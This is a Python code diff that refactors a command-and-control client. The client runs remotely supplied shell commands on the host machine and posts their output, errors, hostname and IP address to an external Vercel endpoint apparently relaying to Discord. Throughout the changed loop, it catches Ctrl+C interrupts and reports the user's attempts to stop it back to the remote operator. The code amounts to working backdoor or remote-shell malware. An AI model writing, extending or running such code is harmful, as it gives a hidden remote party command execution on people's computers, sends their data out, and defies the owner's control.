@@ -1,8 +1,8 @@
 try:
     from requests import get, post
     from time import sleep
-    from subprocess import check_output as system
-    from subprocess import CalledProcessError
+    from subprocess import Popen as system
+    from subprocess import PIPE
     from os import chdir, uname
     from sys import platform
 
@@ -87,75 +87,62 @@ while True:
                         print("Failed to connect to server")
                         continue
                 old_command = command
-                global sperror
-                sperror = None
+                if localcmd:
+                    r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
+                    cmdout, cmderr = r.communicate()
+                else:
+                    r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
+                    cmdout, cmderr = r.communicate()
                 try:
-                    if localcmd:
-                        cmdout = system(localcmd, shell=True).decode()
-                    else:
-                        cmdout = system(command, shell=True).decode()
-                except CalledProcessError as e:
-                    try:
-                        sperror=True
-                    except KeyboardInterrupt:
-                        continue
-                    try:
-                        if e.output.decode() != "":
-                            if e.returncode == 127:
-                                if localcmd:
-                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {localcmd}: Command not found```")
-                                else:
-                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {command}: Command not found```")
+                    if r.returncode != 0:
+                        if r.returncode == 127:
                             if localcmd:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {localcmd}`` ```Error: {e.output.decode()} exited with code {e.returncode}```- {ip}@{hostname}")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {localcmd}: Command not found```")
                             else:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output.decode()} exited with code {e.returncode}```- {ip}@{hostname}")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {command}: Command not found```")
                         else:
-                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}@{hostname}")
+                            if localcmd:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
+                            else:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
+                    elif r.returncode == 0 and cmdout.decode() == "":
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: exited with no output and code {r.returncode}```- {ip}@{hostname}")
+                except KeyboardInterrupt:
+                    try:
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
+                    except KeyboardInterrupt:
+                            continue
+                    continue
+                except:
+                    print("Failed to sent (error)output")
+                    continue
+                if cmdout.decode() != "" and cmderr.decode() == "":
+                    try:
+                        if localcmd:
+                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
+                        else:
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```{cmdout.decode()}```")
                     except KeyboardInterrupt:
                         try:
-                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                         except KeyboardInterrupt:
                                 continue
                         continue
                     except:
-                        print("Failed to sent (error)output")
+                        print("Failed to sent output")
                         continue
-                except KeyboardInterrupt:
+                elif cmdout.decode() == "" and cmderr.decode() == "":
                     try:
-                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to execute command``")
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}@{hostname}")
                     except KeyboardInterrupt:
-                            continue
-                    continue
-                old_command = command
-                if not sperror:
-                    if cmdout != "":
                         try:
-                            if localcmd:
-                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout}```")
-                            else:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```{cmdout}```")
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                         except KeyboardInterrupt:
-                            try:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
-                            except KeyboardInterrupt:
-                                    continue
-                            continue
-                        except:
-                            print("Failed to sent output")
-                            continue
-                    else:
-                        try:
-                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}@{hostname}")
-                        except KeyboardInterrupt:
-                            try:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
-                            except KeyboardInterrupt:
-                                    continue
-                            continue
-                        except:
-                            print("Failed to sent output")
-                            continue
+                                continue
+                        continue
+                    except:
+                        print("Failed to sent output")
+                        continue
                 old_command = command
                 continue
             except:
